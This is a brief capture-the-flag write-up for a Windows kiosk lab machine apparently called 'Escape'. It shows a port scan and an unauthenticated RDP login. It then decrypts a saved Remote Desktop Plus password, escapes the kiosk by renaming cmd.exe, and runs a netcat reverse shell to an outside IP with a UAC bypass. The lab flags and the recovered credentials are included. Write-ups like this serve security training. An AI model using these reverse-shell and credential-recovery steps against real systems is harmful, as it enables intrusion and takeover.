#no_right
Scan 
```sh
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: ESCAPE
|   NetBIOS_Domain_Name: ESCAPE
|   NetBIOS_Computer_Name: ESCAPE
|   DNS_Domain_Name: Escape
|   DNS_Computer_Name: Escape
|   Product_Version: 10.0.19041
|_  System_Time: 2024-07-27T14:01:13+00:00
| ssl-cert: Subject: commonName=Escape
| Not valid before: 2024-07-26T13:53:45
|_Not valid after:  2025-01-25T13:53:45
|_ssl-date: 2024-07-27T14:01:18+00:00; -3s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

- Connect without credentials : 
```sh
xfreerdp /v:10.10.75.175 -sec-nla
```
- Via edge we can access to C:/ folder and grab a password : 
```xml
<!-- Remote Desktop Plus -->

<Data>

<Profile>

<ProfileName>admin</ProfileName>

<UserName>127.0.0.1</UserName>

<Password>JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=</Password>

<Secure>False</Secure>

</Profile>

</Data>
```
- Tool : 
https://gist.github.com/Yeeb1/df3ce82d56ccf4e0c72160d6b87d4d66

- Decrypt : 
```sh
python3 exploit.py --profiles profil.xml
Profile: admin, Username: 127.0.0.1, Password: Twisting3021
```

User VL{e2b03f2ac66ea91fabdce8fc1c109edb}

- Then we download the cmd from system32 , to bypass the security and exec cmd we change his nameto  msedge with F2 because we can't right click .

- Then we download netcat and runascs and exec this command : 
```sh
runas.exe admin Twisting3021 "cmd /c C:\Users\kioskUser0\Downloads\nc.exe 10.8.3.12 4242 -e cmd" --bypass-uac
```

Root VL{d0cf69050fa24e0321c46569a77df9c4}
